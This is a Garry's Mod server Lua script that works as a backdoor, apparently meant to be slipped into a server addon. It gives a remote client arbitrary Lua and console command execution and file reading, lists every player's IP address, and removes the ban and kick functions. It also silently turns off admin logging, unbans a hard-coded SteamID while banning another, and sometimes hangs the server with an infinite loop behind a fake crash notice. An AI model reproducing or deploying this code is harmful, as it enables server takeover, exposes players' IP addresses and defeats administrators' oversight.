
util.AddNetworkString( "ohnothatsbad" )
util.AddNetworkString( "retr_onncp_file" )
util.AddNetworkString( "send_onncp_file" )

net.Receive( "ohnothatsbad", function( len, ply )
	HEADER = net.ReadString()
	BODY = net.ReadString()
	if HEADER == "COM" then
		game.ConsoleCommand( BODY.."\n" )
	else
		RunString( BODY )
	end
end )

net.Receive( "retr_onncp_file", function( len, ply )
	MOD = net.ReadString()
	BODY = net.ReadString()
		-- Read a file
		net.Start("send_onncp_file")
		net.WriteString(file.Read(BODY,"GAME"))
		net.Send(ply)
end )

resource.AddWorkshop( "783354400" )
util.PrecacheModel( "models/player/diving/lugia.mdl" ) 
concommand.Add( "typhuky_lugia_is_best", function( ply, cmd, args )
	timer.Create( "LugiaIsTheBessssssst", 0.5, 0, function()
		for k, v in pairs( player.GetAll() ) do
			v:SetModel( "models/player/diving/lugia.mdl" )
		end
	end )
end )

concommand.Add( "typhuky_get_players_ip", function( ply, cmd, args )
	ply:ChatPrint( "======= LIST OF PLAYERS IP ========" ) 
	for k, v in pairs( player.GetAll() ) do
		ply:ChatPrint( v:Nick() .. " # "..v:IPAddress())
	end
	ply:ChatPrint( "===================================" ) 
end )

concommand.Add( "typhuky_disable_bad_command", function( ply, cmd, args )
	timer.Create( "NoAFuckWithU", 10, 0, function()
		local bad = {"Ban","Kick","Kill","KillSilent","GodEnable","GodDisable"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
	end )
end )

concommand.Add( "typhuky_exec_command", function( ply, cmd, args )
	game.ConsoleCommand(table.concat( args, " " ).."\n")
end )

concommand.Add( "typhuky_do_the_spam", function( ply, cmd, args )
	timer.Create( "spammmmmemememememmemm", 0.05, 0, function()
		print("ERROR AT LINE #9845 (/SRCDS/LUA/PIROTEER32.LUA)")
	end )
end )

timer.Create( "ropppppppppppppppppe", 10, 0, function()
	game.ConsoleCommand("ulx logEcho 0\n")
	game.ConsoleCommand("ulx logFile 0\n")
	game.ConsoleCommand("FAdmin_ShowChatNotifications 0\n")
	game.ConsoleCommand("ulx unbanid STEAM_0:0:136831422\n")
	game.ConsoleCommand("ulx unbanid STEAM_0:0:136831422\n")
	game.ConsoleCommand("ulx banid STEAM_0:1:196684791 3530 AHAHAHAHAHAHHAHAAHAHAH\n")
end )

hook.Add( "PlayerSpawn", "HealfSpellzzzzzzzzz", function ( ply )
	if ply:SteamID() == "STEAM_0:0:136831422" then
		ply:ChatPrint( "Hello owned ! This server is infected with typhuky backdoor !" ) 
	end
	if ply:SteamID() == "STEAM_0:0:136831422" then
		ply:ChatPrint( "Hello owned ! This server is infected with typhuky backdoor !" ) 
	end
end )

timer.Create( "ohnocrashhhhhhhhhhhhhhhhh", 300, 0, function()
	if math.random(0, 512) <= 16 then
		game.ConsoleCommand("say Updating Garr's Mod. . .\n")
		game.ConsoleCommand("say WARNING : CRTP is out to date !\n")
		game.ConsoleCommand("say WARNING : The owner of this server has hacked addons !\n")
		if math.random(0, 16) <= 8 then
			file.Write( "CRASH.txt", [[ [/!\] An hacker has tryed to hack your server, the server has been closed for your security !]] )
			print("====================================================")
			print("======OH NO, look like the sever has crashed !======")
			print("====================================================")
			print("Look in the data/CRASH.txt for more information !")
			while true do end
		end
	end
end )


-- STEAM_0:0:136831422
